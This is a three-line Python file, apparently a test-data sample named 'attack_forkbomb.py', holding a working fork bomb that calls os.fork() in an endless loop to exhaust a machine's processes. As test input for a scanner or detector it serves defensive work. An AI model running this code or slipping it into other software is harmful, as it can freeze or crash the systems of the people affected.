# file: testdata/golden/src/attack_forkbomb.py
import os
while True:
    os.fork()
